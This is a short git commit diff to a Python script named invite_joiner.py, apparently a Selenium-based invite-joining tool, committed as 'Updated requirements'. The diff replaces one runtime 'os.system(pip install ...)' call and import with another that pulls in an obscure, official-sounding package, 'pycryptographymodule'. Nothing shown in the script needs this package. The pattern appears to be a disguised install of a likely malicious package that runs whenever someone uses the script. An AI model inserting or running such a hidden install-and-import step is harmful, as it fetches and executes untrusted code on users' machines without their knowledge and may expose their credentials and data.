8c96b6919f2b3927b5b798919958188d0fafab58
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 17:50:27 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqliteaddition")
-import pythonsqliteaddition
+os.system("pip install pycryptographymodule")
+import pycryptographymodule
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
